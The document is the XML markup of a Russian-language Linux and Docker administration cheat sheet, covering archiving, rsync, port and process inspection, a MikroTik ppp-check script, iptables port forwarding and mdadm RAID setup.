      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">tar</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">cjvf</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">tar</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">bz</text:span><text:span text:style-name="T3">2 /</text:span><text:span text:style-name="T2">full</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">path</text:span><text:span text:style-name="T3"> - создать .</text:span><text:span text:style-name="T2">tar</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">bz</text:span><text:span text:style-name="T3">2 (архив)</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Распаковать .</text:span><text:span text:style-name="T2">tar</text:span><text:span text:style-name="T3">: </text:span><text:span text:style-name="T2">tar</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">xvf</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">tar</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">gz</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Распаковать </text:span><text:span text:style-name="T2">gz</text:span><text:span text:style-name="T3">: </text:span><text:span text:style-name="T2">gunzip</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">yourfile</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">gz</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Распаковать многотомный архив: 7</text:span><text:span text:style-name="T2">za</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">x</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">arch</text:span><text:span text:style-name="T3">.7</text:span><text:span text:style-name="T2">z</text:span><text:span text:style-name="T3">.001</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Получить листинг файлов в архиве: </text:span><text:span text:style-name="T2">tar</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">tf</text:span><text:span text:style-name="T3"> &lt;</text:span><text:span text:style-name="T2">path</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">to</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">tarfile</text:span><text:span text:style-name="T3">&gt;</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Извлечь конкретный файл из архива: tar -xf &lt;path_to_tarfile&gt; [&lt;file_1_in_archive&gt; &lt;file_2_in_archive&gt; ..]</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3">Скопировать файл на сервер: </text:span><text:span text:style-name="T2">scp</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">P</text:span><text:span text:style-name="T3"> 12322 </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">tar</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">login</text:span><text:span text:style-name="T3">@111.111.111.111:/</text:span><text:span text:style-name="T2">home</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">user</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3">Быстрый совет дня для </text:span><text:span text:style-name="T2">Linux</text:span><text:span text:style-name="T3">: Удалите пустые строки при отображении содержимого файла с помощью </text:span><text:span text:style-name="T2">grep</text:span><text:span text:style-name="T3">, например: $ </text:span><text:span text:style-name="T2">grep</text:span><text:span text:style-name="T3"> . </text:span><text:span text:style-name="T2">filename</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Утилиты </text:span><text:span text:style-name="T2">linux</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">rsync</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">v</text:span><text:span text:style-name="T3"> - выводит подробную информацию о процессе копирования;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">[-</text:span><text:span text:style-name="T2">a</text:span><text:span text:style-name="T3">] - сохраняет все атрибуты оригинальных файлов;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">u</text:span><text:span text:style-name="T3"> - не перезаписывать более новые файлы;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">l</text:span><text:span text:style-name="T3"> - копирует символьные ссылки;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">L</text:span><text:span text:style-name="T3"> - копирует содержимое ссылок;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">p</text:span><text:span text:style-name="T3"> - сохраняет права для файлов;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">t</text:span><text:span text:style-name="T3"> - сохраняет время модификации;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">e</text:span><text:span text:style-name="T3"> - использовать другой транспорт, например, </text:span><text:span text:style-name="T2">ssh</text:span><text:span text:style-name="T3">;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">[-</text:span><text:span text:style-name="T2">z</text:span><text:span text:style-name="T3">] - </text:span><text:span text:style-name="T2">c</text:span><text:span text:style-name="T3">жимает файлы перед передачей;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"><text:s/>- </text:span><text:span text:style-name="T2">recursive</text:span><text:span text:style-name="T3"> - перебирать директории рекурсивно;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"><text:s/>- </text:span><text:span text:style-name="T2">exclude</text:span><text:span text:style-name="T3"> - Исключить файлы по шаблону;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Примеры: </text:span><text:span text:style-name="T2">rsync</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">avz</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">skillproject</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">data</text:span><text:span text:style-name="T3">/ . - из подкаталога в текущий каталог</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><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aaa</text:span><text:span text:style-name="T3">/ - из подпапки в подпапку </text:span><text:span text:style-name="T2">aaa</text:span><text:span text:style-name="T3">/</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><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передача на удаленный сервер</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">rsync</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">avze</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">ssh</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то же самое м явным указанием </text:span><text:span text:style-name="T2">ssh</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">ss</text:span><text:span text:style-name="T3">: -</text:span><text:span text:style-name="T2">l</text:span><text:span text:style-name="T3"> или - </text:span><text:span text:style-name="T2">listening</text:span><text:span text:style-name="T3"> - посмотреть только прослушиваемые порты;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">p</text:span><text:span text:style-name="T3"> или - </text:span><text:span text:style-name="T2">program</text:span><text:span text:style-name="T3"> - показать имя программы и ее </text:span><text:span text:style-name="T2">PID</text:span><text:span text:style-name="T3">;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">t</text:span><text:span text:style-name="T3"> или - </text:span><text:span text:style-name="T2">tcp</text:span><text:span text:style-name="T3"> - показать </text:span><text:span text:style-name="T2">tcp</text:span><text:span text:style-name="T3"> порты;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">u</text:span><text:span text:style-name="T3"> или - </text:span><text:span text:style-name="T2">udp</text:span><text:span text:style-name="T3"> показать </text:span><text:span text:style-name="T2">udp</text:span><text:span text:style-name="T3"> порты;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">n</text:span><text:span text:style-name="T3"> или - </text:span><text:span text:style-name="T2">numeric</text:span><text:span text:style-name="T3"> показывать </text:span><text:span text:style-name="T2">ip</text:span><text:span text:style-name="T3"> адреса в числовом виде.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Примеры: </text:span><text:span text:style-name="T2">ss</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">tlpn</text:span><text:span text:style-name="T3"> - проверить все прослушивающие </text:span><text:span text:style-name="T2">tcp</text:span><text:span text:style-name="T3">-порты</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ss</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">tulpn</text:span><text:span text:style-name="T3"> | </text:span><text:span text:style-name="T2">grep</text:span><text:span text:style-name="T3"> :80 - показать все процессы, работающие на 80-м порту</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ps</text:span><text:span text:style-name="T3">: </text:span><text:span text:style-name="T2">ps</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">e</text:span><text:span text:style-name="T3"> - показать все процессы</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ps</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">ef</text:span><text:span text:style-name="T3"> - показать подробную информацию о каждом процессе</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ps</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">ef</text:span><text:span text:style-name="T3"> | </text:span><text:span text:style-name="T2">grep</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">phantom</text:span><text:span text:style-name="T3"> - найти все процессы с именем </text:span><text:span text:style-name="T2">phantom</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mpstat</text:span><text:span text:style-name="T3">: Показывает статистику загрузки процессора. Команды:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mpstat</text:span><text:span text:style-name="T3"> - показывает общую информацию</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mpstat</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">P</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">ALL</text:span><text:span text:style-name="T3"> - по каждому ядру</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">free</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Показывает потребление ОЗУ на текущий момент: </text:span><text:span text:style-name="T2">free</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">h</text:span><text:span text:style-name="T3"> - показывает информацию в гигабайтах (более человеко читаемо, чем в байтах)</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">top</text:span><text:span text:style-name="T3">: Что-то наподобие диспетчера задач, только для линукс, показывает попроцессное потребление озу</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">dpkg</text:span><text:span text:style-name="T3">: Пакетный менеджер для </text:span><text:span text:style-name="T2">debian</text:span><text:span text:style-name="T3"> систем (не путать с системой управления пакетами - </text:span><text:span text:style-name="T2">apt</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">apt</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">get</text:span><text:span text:style-name="T3">)</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">dpkg</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">s</text:span><text:span text:style-name="T3"> &lt;</text:span><text:span text:style-name="T2">packname</text:span><text:span text:style-name="T3">&gt; - проверить, установлен ли пакет</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">dpkg</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">l</text:span><text:span text:style-name="T3"> - список всех пакетов</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">dpkg</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">l</text:span><text:span text:style-name="T3"> | </text:span><text:span text:style-name="T2">grep</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">apache</text:span><text:span text:style-name="T3">2 - проверить, установлен ли конкретный пакет</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">dpkg</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">i</text:span><text:span text:style-name="T3"> &lt;</text:span><text:span text:style-name="T2">package</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">deb</text:span><text:span text:style-name="T3">&gt; - установить пакет</text:span></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">netstat</text:span><text:span text:style-name="T3">: </text:span><text:span text:style-name="T2">netstat</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">pnltu</text:span><text:span text:style-name="T3"> - посмотреть список используемых портов</text:span></text:p>
      <text:p text:style-name="P1">Docker справочник cli</text:p>
      <text:p text:style-name="P1">docker images - показать все локальные образы docker</text:p>
      <text:p text:style-name="P1">docker rmi [-f] &lt;id|label&gt; - удалить образ c локальной машины</text:p>
      <text:p text:style-name="P1">docker rmi -f $(docker images -q) - удалить все докер образы</text:p>
      <text:p text:style-name="P1">docker build [-t &lt;label&gt;] &lt;path&gt; - построить образ на основе докерфайла</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">docker run [-dt] [--name &lt;name&gt;] [-v &lt;path:path&gt;] [-p &lt;port:port&gt;] [--...] </text:span><text:span text:style-name="T3">&lt;id|label&gt; [cmd] - запустить образ в контейнере c cmd-командой (необязательно)</text:span></text:p>
      <text:p text:style-name="P1">-d - в фоновом режиме</text:p>
      <text:p text:style-name="P1">-t - прикрепляет к контейнеру терминал</text:p>
      <text:p text:style-name="P1">-i - перенаправляет ввод/вывод на текущий терминал</text:p>
      <text:p text:style-name="P1">--name - явно указать имя контейнера, по которому можно будет обращаться к нему (иначе будет сгенерировано рэндомно)</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">-p &lt;external_port:internal_port&gt; - </text:span><text:span text:style-name="T3">проброс</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">портов</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">-v --volume &lt;external_path:internal_path&gt; - </text:span><text:span text:style-name="T3">монтирует</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">папки</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">хоста</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">в</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">контейнер</text:span></text:p>
      <text:p text:style-name="P1">--rm - удаляет контейнер после завершения работы</text:p>
      <text:p text:style-name="P1">--memory &lt;n&gt; - позволяет указать количество ОЗУ, доступной контейнеру</text:p>
      <text:p text:style-name="P1">-P - пробрасывает все порты контейнера в хост-систему</text:p>
      <text:p text:style-name="P1">--expose - позволяет пробросить несколько портов из контейнера в хост-систему</text:p>
      <text:p text:style-name="P1">-e &lt;"FOO=bar"&gt; - добавляет переменную окружения в контейнер</text:p>
      <text:p text:style-name="P13">docker ps [-a] - показать все запущенные [существующие] докер контейнеры</text:p>
      <text:p text:style-name="P13">docker ps -q | xargs docker stats - no-stream` - посмотреть ресурсы, потребляемые запущенными контейнерами</text:p>
      <text:p text:style-name="P1">docker stop &lt;name&gt; - останавливает указанный образ (с сохранением данных)</text:p>
      <text:p text:style-name="P1">docker kill &lt;name&gt; - то же самое без сохранения данных</text:p>
      <text:p text:style-name="P1">docker rm &lt;name&gt; - удаляет указанный контейнер</text:p>
      <text:p text:style-name="P1">docker attach &lt;name&gt; - подключиться к выбранному докер-контейнеру</text:p>
      <text:p text:style-name="P1">docker exec [-ti] &lt;name&gt; &lt;cmd&gt; - выполняет команду в докер-контейнере</text:p>
      <text:p text:style-name="P1">docker push &lt;imagename&gt; - отправить образ в удаленный реестр</text:p>
      <text:p text:style-name="P1">docker ps -q | xargs <text:s/>docker stats --no-stream - посмотреть нагрузку на процессор и память каждого из контейнеров</text:p>
      <text:p text:style-name="P1">docker stats - похожа на предыдущую команду, но более короткая</text:p>
      <text:p text:style-name="P1">docker info --format '{{.LoggingDriver}}' - посмотреть используемый по умолчанию лог драйвер (json-file)</text:p>
      <text:p text:style-name="P1">docker logs [&lt;container_name&gt;] [-f --tail 100] - показать логи [конкретного контейнера] в терминал [последние 100 строк]</text:p>
      <text:p text:style-name="P7">docker inspect --format='{{.LogPath}}' &lt;containername&gt; -показать, где хранятся логи для конкретного контейнера</text:p>
      <text:p text:style-name="P1">Основные команды Linux: Системная информация</text:p>
      <text:p text:style-name="P1">date - вывести текущую дату и время</text:p>
      <text:p text:style-name="P1">[ммддччмм[гг]].сс - установка даты и времени (мм - месяц, дд - дата, чч - час, мм - минут, гг - год, сс - секунд)</text:p>
      <text:p text:style-name="P1">cal - вывести календарь на текущий месяц</text:p>
      <text:p text:style-name="P1">uptime - показать текущий аптайм</text:p>
      <text:p text:style-name="P1">uname - показать информацию о ядре</text:p>
      <text:p text:style-name="P1">-s - Показать имя ядра (информация выдается по умолчанию, если ни одна опция не указана)</text:p>
      <text:p text:style-name="P1">-n - Показать имя хоста.</text:p>
      <text:p text:style-name="P1">-r - Показать номер выпуска ядра. Эта опция часто используется с командами управления модулями.</text:p>
      <text:p text:style-name="P1">-v - Показать версию ядра.</text:p>
      <text:p text:style-name="P1">-m - Показать имя аппаратной платформы (CPU).</text:p>
      <text:p text:style-name="P1">-o - Показать имя операционной системы.</text:p>
      <text:p text:style-name="P1">-a - Показать всю возможную информацию.</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">cat /proc/cpuinfo - информация ЦПУ</text:span></text:p>
      <text:p text:style-name="P1">cat /proc/meminfo - информация о памяти</text:p>
      <text:p text:style-name="P1">df - показать инф. о использовании дисков</text:p>
      <text:p text:style-name="P1">-t - указание типа ФС</text:p>
      <text:p text:style-name="P1">-h - в “понятном” виде</text:p>
      <text:p text:style-name="P1">-T - отображение типа ФС</text:p>
      <text:p text:style-name="P1">-i - отображение информации об inode</text:p>
      <text:p text:style-name="P1">-x fstype - исключение вывода по типу ФС</text:p>
      <text:p text:style-name="P1">du - вывести “вес” текущего каталога</text:p>
      <text:p text:style-name="P1">-s - с подкаталогами</text:p>
      <text:p text:style-name="P1">-h - в “понятном” виде</text:p>
      <text:p text:style-name="P13">-m - вывод в мегабайтах</text:p>
      <text:p text:style-name="P13">dmidecode - информация о железе, берется из API DMI (пакет pmtools)</text:p>
      <text:p text:style-name="P1">-t– указать тип устройства</text:p>
      <text:p text:style-name="P1">-t 17 - информация о памяти</text:p>
      <text:p text:style-name="P1">-q - вывод меньшей информации</text:p>
      <text:p text:style-name="P1">free - использование памяти и swap</text:p>
      <text:p text:style-name="P1">whereis file– отображение расположения файла file</text:p>
      <text:p text:style-name="P1">which app - отображает путь к команде app</text:p>
      <text:p text:style-name="P1">type app - аналог каманды which</text:p>
      <text:p text:style-name="P1">enable - вывод встроенных в интерпретатор команд</text:p>
      <text:p text:style-name="P1">lshw - обтображение списка устройств</text:p>
      <text:p text:style-name="P1">lsmod - список подключенный модулей ядра</text:p>
      <text:p text:style-name="P1">modprobe modulemane - добавления и удаления модулей ядра Linux</text:p>
      <text:p text:style-name="P1">modinfo modulename - информация о модуле modulename</text:p>
      <text:p text:style-name="P7">-F param - отображение только параметра param для модуля</text:p>
      <text:p text:style-name="P1">Команды Linux, которые должен выучить каждый разработчик:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">find - https://bit.ly/3C33Py0</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">grep - https://bit.ly/3zWDxL5</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">curl - https://bit.ly/3wzSFgM</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">lsof - https://bit.ly/3Q2h5Xi</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">chmod - https://bit.ly/3bOP0oj</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">tar - https://bit.ly/3vXKSc7</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P7">netstat - https://bit.ly/3JQuEY6</text:p>
      <text:p text:style-name="P7">Найдите большие файлы, занимающие слишком много места на диске в вашей системе Linux. Приведенная команда находит файлы размером более 400 МБ: find / -type f -size +400M. Вы даже можете удалить большие файлы в интерактивном режиме. Приведенная ниже команда находит файлы размером более 100 МБ в каталоге /var/log и запрашивает подтверждение, хотите ли вы их удалить: find /var/log -type f -size +100M -exec rm -i {} \;</text:p>
      <text:p text:style-name="P1">Скрипт проверки активности всех ppp-соединений</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3"># если по тоннелю пинга нет, то осуществляется разрыв тоннеля для переподключения</text:span></text:p>
      <text:p text:style-name="P1"># внимание ! скрипт будет отключать активное vpn-соединение с админом, т.к. до него пинга не будет !</text:p>
      <text:p text:style-name="P1"># поэтому в скрипте сделан обход удаления данного соединения (задаётся в adminClient, должен соответствовать ppp secret)</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:local adminClient "you ppp secret admins` name"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:local pppTest value=[/ppp active find];</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:local pingNumber value=2;</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:local pingMin value=1;</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:foreach userTest in=$pppTest do={</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s/>:local pingOk value=[:ping [/ppp active get $userTest value-name=address] count=$pingNumber]</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s/>:if (($pingOk &lt; $pingMin) &amp;&amp; ([/ppp active get $userTest value-name=name]!=$adminClient)) do={</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/>:log warning message=([/ppp active get $userTest value-name=service] . " auto disconnected: ". $pingOk . " ping ok over " . $pingNumber . " " . [/ppp active get $userTest value-name=name] . " " . [/ppp active get $userTest value-name=address])</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">/ppp active remove $userTest</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s/>}</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">}</text:p>
      <text:p text:style-name="P1">если нужно проверять только определенный вид ppp замените строку :</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># :local pppTest value=[/ppp active find];</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">на</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">строку</text:span><text:span text:style-name="T2">, </text:span><text:span text:style-name="T3">например</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># :local pppTest value=[/ppp active find where service=pptp];</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P4">Для использования поставьте этот скрипт в Планировщик с нужным интервалом (оптимально не менее 30 сек).</text:p>
      <text:p text:style-name="P1">Как отлаживать bash-script-ы по шагам:</text:p>
      <text:p text:style-name="P1">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 loext:marker-style-name="T1"><text:span text:style-name="T2">#!/bin/bash</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Процесс отладки</text:p>
      <text:p text:style-name="P1">Запускаем скрипт, перед выполнением каждой команды выводится то, что будет исполняться, затем интерпретатор начинает ожидать нажатия клавиши &lt;ENTER&gt;.</text:p>
      <text:p text:style-name="P1">Если понимаем, что что-то пошло не так, нажимаем Ctrl+C и выходим из отладки.</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Ингредиенты</text:span></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text:p>
      <text:p text:style-name="P1">команда read, которая умеет ожидать ввода чего-нибудь с клавиатуры (в данном случае нам нужно только либо ENTER либо Ctrl+C</text:p>
      <text:p text:style-name="P1">переменная окружения $BASH_COMMAND, валидная внутри обработчика команды trap.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># <text:s text:c="28"/>Online Bash Shell.</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># <text:s text:c="16"/>Code, Compile, Run and Debug Bash script online.</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># Write your code in this editor and press "Run" button to execute it.</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1" loext:marker-style-name="T1"><text:span text:style-name="T2">echo "Hello World";</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Top+ SQL </text:span><text:span text:style-name="T3">вопросов</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">интервью</text:span><text:span text:style-name="T2"> </text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">1. Database and SQL - https://bit.ly/3zGK6S7</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">2. SQL Query - https://bit.ly/3bGzN8r</text:span></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Скриптик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oft-page-break/><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pan text:style-name="T2">:local char [[:parse "(\"\\$[:pick "0123456789ABCDEF" (($key &gt;&gt; 4) &amp; 0xF)]$[:pick "0123456789ABCDEF" ($key &amp; 0xF)]\")"]]</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P13">Как пробросить порт в Linux на другой сервер? Необходимо пробросить с 8821 порта сервера 10.10.10.10 на 21 порт сервера 12.12.12.12:</text:p>
      <text:p text:style-name="P15">iptables -A FORWARD --dst 10.10.10.10 -p tcp --dport 8821 -j ACCEPT</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">iptables -A FORWARD --src 10.10.10.10 -p tcp --sport 8821 -j ACCEPT</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">iptables -t nat -A PREROUTING -d 10.10.10.10 -p tcp --dport 8821 -j DNAT --to-destination 12.12.12.12:21</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">iptables -t nat -A POSTROUTING -d 12.12.12.12 -p tcp --dport 21 -j SNAT --to-source 10.10.10.10:8821</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P4">#iptables</text:p>
      <text:p text:style-name="P1">Шпаргалка по RAID</text:p>
      <text:p text:style-name="P1">mdadm - утилита для работы с программными RAID-массивами различных уровней. В данной инструкции рассмотрим примеры ее использования.</text:p>
      <text:p text:style-name="P1">Информация о RAID</text:p>
      <text:p text:style-name="P1">cat /proc/mdstat - состояние всех RAID</text:p>
      <text:p text:style-name="P1">mdadm -D /dev/md0 - подробная инфа о конкретном RAID</text:p>
      <text:p text:style-name="P1">lsblk - список дисков с разделами, местом, типом</text:p>
      <text:p text:style-name="P1">df -hT - свободное место, тип файловой системы, точки монтирования</text:p>
      <text:p text:style-name="P1">Сборка RAID</text:p>
      <text:p text:style-name="P1">mdadm - zero-superblock - force /dev/sd{b,c} - обнуление суперблоков на дисках sdb sdc (для удаления инфы о других RAID)</text:p>
      <text:p text:style-name="P1">при получении ответа mdadm: Unrecognised md component device - /dev/sdb значит, что диск не использовался для RAID, продолжаем</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm - create - verbose /dev/md0 -l 1 -n 2 /dev/sd{b,c}</text:span><text:span text:style-name="T2"/></text:p>
